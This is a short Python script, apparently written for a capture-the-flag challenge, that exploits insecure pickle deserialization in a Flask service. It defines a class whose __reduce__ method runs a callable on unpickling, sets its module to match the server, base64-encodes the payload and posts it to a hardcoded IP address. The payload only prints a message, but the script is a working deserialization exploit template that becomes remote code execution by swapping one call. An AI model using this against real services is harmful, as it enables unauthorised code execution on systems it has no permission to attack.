import pickle, base64, requests

class Exploit:
    def __reduce__(self):
        return (print, ("Flag exploit",))

# chỉnh module để trùng với server (main process Flask)
Exploit.__module__ = "__main__"

payload = pickle.dumps(Exploit())
b64_payload = base64.b64encode(payload).decode()
print("[+] Payload base64:", b64_payload)

r = requests.post("http://160.250.64.22:4100/submit", data={"data": b64_payload})
print("=== Server response ===")
print(r.text)
